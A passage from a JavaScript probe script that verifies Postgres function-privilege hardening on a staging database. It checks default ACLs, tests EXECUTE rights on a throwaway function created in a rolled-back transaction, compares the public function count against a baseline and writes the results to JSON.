  rec('T3', 'catalog', 'default ACL for new functions (role postgres)', 'no anon/authenticated in schema public; global PUBLIC removed', acl, !/anon=X/.test(publicSchemaAcl) && !/authenticated=X/.test(publicSchemaAcl) && /\(global\)|0:/.test(acl) ? 'CLOSED' : 'STILL OPEN');
  // Behavioral proof for future functions: create one in a rolled-back transaction.
  const fut = psql(`BEGIN;
    CREATE FUNCTION public.s00a_probe_future_fn() RETURNS int LANGUAGE sql AS 'select 1';
    SELECT json_build_object('public', has_function_privilege('public','public.s00a_probe_future_fn()','EXECUTE'), 'anon', has_function_privilege('anon','public.s00a_probe_future_fn()','EXECUTE'), 'authenticated', has_function_privilege('authenticated','public.s00a_probe_future_fn()','EXECUTE'), 'service_role', has_function_privilege('service_role','public.s00a_probe_future_fn()','EXECUTE'));
    ROLLBACK;`);
  const f = JSON.parse(fut);
  rec('CAT-future', 'catalog (rolled-back txn)', 'EXECUTE on a newly created public function', 'PUBLIC/anon/authenticated false; service_role true', fut, !f.public && !f.anon && !f.authenticated && f.service_role ? 'HARDENED' : 'NOT HARDENED');
  const other = psql(`select count(*) from pg_proc p join pg_namespace n on n.oid=p.pronamespace where n.nspname='public';`, {}, { readOnly: true });
  rec('CAT-count', 'catalog', 'public function count unchanged (no function added/dropped by A1)', '13 (baseline)', other, other === '13' ? 'UNCHANGED' : 'CHANGED');
  reseed();
}

async function svgItems() { return (await svcGet('purchase_items?select=id,transaction_id,transactions!inner(channel)&transactions.channel=eq.store')).length; }
async function svgInv(id) { return (await svcGet(`channel_inventory?id=eq.${id}&select=stock`))?.[0]; }

try {
  if (phase === 'before') await before();
  else if (phase === 'regression') await regression();
  else if (phase === 'after-a1') await afterA1();
  else { console.error('usage: probe.mjs before|regression <out.json>'); process.exit(2); }
} catch (e) { results.push({ id: 'ABORTED', error: String(e.message || e) }); console.error('ABORTED:', String(e.message || e)); }
if (outFile) writeFileSync(outFile, JSON.stringify({ phase, ranAt: new Date().toISOString(), target: 'staging faltxpkaicwpnlqaxrdu', results }, null, 2));
